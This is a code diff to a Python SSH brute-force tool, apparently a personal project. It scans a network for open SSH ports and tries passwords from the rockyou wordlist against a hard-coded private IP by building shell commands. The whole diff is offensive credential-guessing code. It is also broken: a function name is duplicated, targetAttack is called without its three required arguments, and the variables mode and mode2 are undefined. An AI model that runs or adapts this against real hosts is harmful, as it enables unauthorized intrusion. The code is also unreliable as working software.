@@ -6,7 +6,7 @@ import datetime
 -------------------------------------------------------MYIMPORTS-------------------------------------------------------
 '''
 
-import ScanNetwork
+import SSHScanNetwork
 import SSHFiles
 
 '''
@@ -31,19 +31,26 @@ server = "192.168.1.131"
 -------------------------------------------------------FILES TO READ-------------------------------------------------------
 '''
 
-pws = open("rockyou2.txt")
+passwordFile = "rockyou2.txt"
+usernameFile = "usernames.txt"
+
+#Reading passwords
+fileName = os.path.join(SSHFiles.getPathToCurrentDir() + passwordFile)
+pws = open(fileName)
 passwords = pws.readlines()
 
-usr = open("usernames.txt")
+#Reading usernames
+fileName = os.path.join(SSHFiles.getPathToCurrentDir() + usernameFile)
+usr = open(fileName)
 usernames = usr.readlines()
 
-ipAddresses = ScanNetwork.filterNmapOutput()
-
+ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()
+print(ipAddresses)
 
 
 #        output = os.popen(command).read()
 #        print(output)
-# sudo apt install sshpass
+#        sudo apt install sshpass
 #        if "Welcome to" in output:
             #Successfully breached
             #break
@@ -69,7 +76,7 @@ def formatTime(runtimeSeconds, minutes, hours, days):
 -------------------------------------------------------PROGRAMS-------------------------------------------------------
 '''
 
-def sshMain():
+def attackAllOnScannedNetworkBySequenceImproved():
     counter = 0
     isError = False
     for ip in ipAddresses:
@@ -97,11 +104,45 @@ def sshMain():
                     isError = True
                     break
 
-def targetAttack():
+def attackAllOnScannedNetworkBySequenceImproved():
+    counter = 0
+    isError = False
+    for ip in ipAddresses:
+        if isError:
+            break
+
+
+def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
+    # EG VAR HER SIST
+    #ipAddress, usernameOrpassword, howManyInstances
+    #Used when you have additional information about target
+
+    #username = -u 'username'
+    #password = -p 'password'
+
     print("")
+
+    nilsIP = "192.168.1.111"
+    counter = 0
+    isError = False
+    for pw in passwords:
+        try:
+            if isError:
+                break
+            counter += 1
+            pw = pw[:-1]
+            password = str(pw)
+            command = mode + " " + password + " " + mode2 + " potet" + "@" + nilsIP
+            os.system(command)
+        except KeyboardInterrupt:
+            print("etasd")
+            isError = True
+            break
+
+#def readPreviouslyAttacked(listWithIPs):
 
 '''
 -------------------------------------------------------MAIN-------------------------------------------------------
 '''
 
-sshMain()
+targetAttack()
